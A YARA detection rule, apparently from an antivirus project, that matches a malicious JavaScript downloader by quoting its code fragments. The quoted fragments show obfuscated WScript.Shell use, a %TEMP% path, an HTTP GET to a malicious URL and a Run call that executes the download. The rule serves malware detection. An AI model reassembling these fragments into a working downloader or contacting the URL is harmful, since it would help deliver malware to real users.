rule sig_20160427_759b943c68372af7a5014748179622f8 {
  meta:
    description = "datamaliciousorder - file 20160427_759b943c68372af7a5014748179622f8.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9e35077257072091e5130b5a7136804fdb4da5760f2aebf6baffc58be33217af"

  strings:
    $s1  = "function ZywxjLpmdv() {return XbisgBblcg[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"4iF9jsz" ascii
    $s2  = "function ZywxjLpmdv() {return XbisgBblcg[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"4iF9jsz" ascii
    $s3  = "function FzbpxEldfx(ScfppUnfke, XjtvcJvkfb){FurkwEeaws = FurkwEeaws * 1; return ScfppUnfke - XjtvcJvkfb;};" fullword ascii
    $s4  = "var XbisgBblcg = function KwdfuWxnzl() {return UktvmJpvxm[XgpclBzyom](\"WScript\"+\".Shell\");}(), MzwruHpbbl = 11;" fullword ascii
    $s5  = "AksmgQqbwk[VsqrtLmisr](\"G\" + \"ET\", \"http://games-k.ru/n8eis\", false);" fullword ascii
    $s6  = "var UktvmJpvxm = this[\"WScript\"];" fullword ascii
    $s7  = "if (AksmgQqbwk[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function FeoncStepd(){return ZcerxHpvhr + \"\";};" fullword ascii
    $s9  = "function LbcygGxrsq() {return ((HykdvMhqgx == true) && (HykdvMhqgx == AddvrAwoka)) ? 1 : FurkwEeaws;};" fullword ascii
    $s10 = "function BzusdUrltn(){return XgpclBzyom;};" fullword ascii
    $s11 = "var SodhqIvxoj = new this[\"D\"+\"ate\"]();" fullword ascii
    $s12 = "AddvrAwoka = true; " fullword ascii
    $s13 = "function ZtftlJyowa(UlfjrUckda) {var WvxkxEexak = (1, 2, 3, 4, 5, UlfjrUckda); return WvxkxEexak;};" fullword ascii
    $s14 = "function SkdmzJittr(){return 23;};" fullword ascii
    $s15 = "var HykdvMhqgx = false;" fullword ascii
    $s16 = "function XipjsDcekn(FkehtZdctp){XbisgBblcg[\"R\"+\"un\"](FkehtZdctp, FurkwEeaws, FurkwEeaws);};" fullword ascii
    $s17 = "var AddvrAwoka = false;" fullword ascii
    $s18 = "return FzbpxEldfx(SocxdLvqdz, JatrcLobul);" fullword ascii
    $s19 = "function WynktFbzos()" fullword ascii
    $s20 = "HykdvMhqgx = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}